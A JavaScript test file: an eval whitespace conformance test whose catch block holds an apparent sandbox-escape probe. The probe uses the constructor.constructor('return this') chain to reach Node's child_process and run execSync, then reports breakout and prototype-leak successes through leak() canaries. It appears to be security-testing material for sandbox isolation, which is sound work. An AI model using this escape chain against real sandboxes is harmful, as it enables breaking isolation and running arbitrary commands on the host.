try {
    if (eval('+\t1') !== 1) {
        $ERROR('#1: +\\u00091 === 1');
    }
    if (eval('+\x0B1') !== 1) {
        $ERROR('#2: +\\u000B1 === 1');
    }
    if (eval('+\f1') !== 1) {
        $ERROR('#3: +\\u000C1 === 1');
    }
    if (eval('+ 1') !== 1) {
        $ERROR('#4: +\\u0020 === 1');
    }
    if (eval('+\xA01') !== 1) {
        $ERROR('#5: +\\u00A01 === 1');
    }
    if (eval('+\n1') !== 1) {
        $ERROR('#6: +\\u000A1 === 1');
    }
    if (eval('+\r1') !== 1) {
        $ERROR('#7: +\\u000D1 === 1');
    }
    if (eval('+\u20281') !== 1) {
        $ERROR('#8: +\\u20281 === 1');
    }
    if (eval('+\u20291') !== 1) {
        $ERROR('#9: +\\u20291 === 1');
    }
    if (eval('+\t\x0B\f \xA0\n\r\u2028\u20291') !== 1) {
        $ERROR('#10: +\\u0009\\u000B\\u000C\\u0020\\u00A0\\u000A\\u000D\\u2028\\u20291 === 1');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}